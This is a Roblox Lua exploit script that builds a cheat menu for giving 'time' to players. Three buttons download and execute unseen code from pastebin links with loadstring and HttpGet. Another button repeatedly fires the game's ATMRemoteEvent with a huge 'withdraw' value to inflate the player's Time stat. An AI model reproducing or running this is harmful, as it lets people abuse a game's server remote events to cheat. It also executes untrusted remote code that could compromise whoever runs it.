-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.Position = UDim2.new(0.37243399, 0, 0.295918375, 0)
Frame.Size = UDim2.new(0, 303, 0, 273)
Frame.Active = true
Frame.Draggable = true

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.Position = UDim2.new(-3.7252903e-09, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 250, 0, 38)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Limited time GUI(trash)"
TextLabel.TextColor3 = Color3.fromRGB(170, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
TextButton.BorderColor3 = Color3.fromRGB(74, 74, 74)
TextButton.Position = UDim2.new(0.220879987, 0, 0.189613432, 0)
TextButton.Size = UDim2.new(0, 168, 0, 44)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Start"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
TextButton.MouseButton1Down:connect(function()
 loadstring(game:HttpGet("https://pastebin.com/raw/zNatL5t3"))()
end)


TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
TextButton_2.BorderColor3 = Color3.fromRGB(74, 74, 74)
TextButton_2.Position = UDim2.new(0.220879987, 0, 0.416129202, 0)
TextButton_2.Size = UDim2.new(0, 168, 0, 44)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Stop(takes a while)"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 20.000
TextButton_2.TextWrapped = true
TextButton_2.MouseButton1Down:connect(function()
 loadstring(game:HttpGet("https://pastebin.com/raw/BDcdYhvU"))()
end)

TextButton_3.Parent = Frame
TextButton_3.BackgroundColor3 = Color3.fromRGB(46, 95, 83)
TextButton_3.Position = UDim2.new(0.123501167, 0, 0.658144891, 0)
TextButton_3.Size = UDim2.new(0, 100, 0, 34)
TextButton_3.Font = Enum.Font.LuckiestGuy
TextButton_3.Text = "EMERGENCY STOP"
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true
TextButton_3.MouseButton1Down:connect(function()
 loadstring(game:HttpGet("https://pastebin.com/raw/yVdXMaFy"))()
end)

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.Position = UDim2.new(0, 0, 0.83952415, 0)
TextLabel_2.Size = UDim2.new(0, 303, 0, 43)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Give entire server time script"
TextLabel_2.TextColor3 = Color3.fromRGB(254, 254, 254)
TextLabel_2.TextSize = 14.000

TextButton_4.Parent = Frame
TextButton_4.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextButton_4.Position = UDim2.new(0.828140736, 0, 0, 0)
TextButton_4.Size = UDim2.new(0, 52, 0, 38)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "CLOSE"
TextButton_4.TextColor3 = Color3.fromRGB(249, 249, 249)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextWrapped = true

TextButton_5.Parent = Frame
TextButton_5.BackgroundColor3 = Color3.fromRGB(46, 95, 83)
TextButton_5.Position = UDim2.new(0.559144735, 0, 0.658144891, 0)
TextButton_5.Size = UDim2.new(0, 100, 0, 34)
TextButton_5.Font = Enum.Font.LuckiestGuy
TextButton_5.Text = "Get 9qn time (must have 9qn in atm)"
TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.TextScaled = true
TextButton_5.TextSize = 14.000
TextButton_5.TextWrapped = true
TextButton_5.MouseButton1Down:connect(function()
 local player = game.Players.LocalPlayer
 local time = player:WaitForChild("leaderstats").Time
 local maxTime = 9 * 10^18

 while true do
  wait()

  if time.Value > maxTime then
   break -- End the loop
  end

  local args = {
   [1] = "50050000000000000",
   [2] = "withdraw"
  }
  game:GetService("ReplicatedStorage").ATMRemoteEvent:FireServer(unpack(args))
 end
end)

-- Scripts:

local function YROD_fake_script() -- TextButton_4.LocalScript 
 local script = Instance.new('LocalScript', TextButton_4)

 script.Parent.MouseButton1Click:Connect(function()
  script.Parent.Parent.Visible = false
 end)
 
end
coroutine.wrap(YROD_fake_script)()